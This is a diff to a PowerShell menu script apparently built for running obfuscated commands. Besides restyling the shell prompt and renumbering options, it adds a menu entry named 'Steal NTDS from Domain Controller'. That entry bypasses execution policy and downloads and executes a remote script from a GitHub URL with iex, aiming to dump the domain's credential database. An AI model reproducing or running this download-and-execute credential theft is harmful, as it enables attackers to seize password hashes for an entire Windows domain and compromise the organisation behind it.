@@ -2,22 +2,26 @@
 function Get-ObfuscatedCommandMenu {
 
 # Global Function
+
 function global:prompt {
-    $user = [Environment]::UserName
-    $comp = [Environment]::MachineName
+    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
-    # Get local IP address
-    $ip = [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).AddressList[0].IPAddressToString
-   
-    # ANSI escape for a "bold" feel
-    $e = [char]27
-    $promptString = "$e[91m$user$e[0m@$e[91m$comp$e[0m"
-   
-    Write-Host "[$promptString]" -NoNewline
-    Write-Host "──[$ip]" -ForegroundColor Yellow -NoNewline
-   
-    return "`n$e[91m#$e[0m "
+    $userColor = "Cyan"                  # Soft cyan for username@host
+    $promptColor = if ($isAdmin) { "Yellow" } else { "Green" }  # Soft yellow for admin !, green for $
+    $promptSign = if ($isAdmin) { "!" } else { "$" }
+    
+    Write-Host "┌──(" -ForegroundColor DarkGray -NoNewline
+    Write-Host "$env:USERNAME@$env:COMPUTERNAME" -ForegroundColor $userColor -NoNewline
+    Write-Host ")-[" -ForegroundColor DarkGray -NoNewline
+    Write-Host "PCT" -ForegroundColor Magenta -NoNewline          # Soothing magenta highlight
+    Write-Host "]" -ForegroundColor DarkGray
+    Write-Host "└─$promptSign " -ForegroundColor $promptColor -NoNewline
+    
+    return " "
 }
+
 
     # Function to display the professional header
     function Show-Header {
@@ -133,13 +137,21 @@ function global:prompt {
         Name    = "Check Disk Space"
         Command = { Get-Disk }
     }
-  
+
     6 = @{
+        Name    = "Steal NTDS from Domain Controller"
+        Command = {
+        powershell -NoExit -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/Create-NTDSBackup.ps1'))"
+        }
+    }
+
+  
+    7 = @{
         Name    = "Show Obfuscation Info"
         Command = $null
     }
   
-    7 = @{
+    8 = @{
         Name    = "Exit"
         Command = $null
     }
@@ -270,7 +282,7 @@ function global:prompt {
 
         # Validate input
         if ($choice -match '^\d+$' -and $menuOptions.ContainsKey([int]$choice)) {
-            if ($choice -eq 7) {
+            if ($choice -eq 8) {
                 Clear-Host
                 Show-Header
                 Write-Host "┌─ GOODBYE ───────────────────────────────────────────────────────────────────┐" -ForegroundColor "Magenta"
@@ -281,7 +293,7 @@ function global:prompt {
                 break
             }
 
-            if ($choice -eq 6) {
+            if ($choice -eq 7) {
                 Show-ObfuscationInfo
                 continue
             }
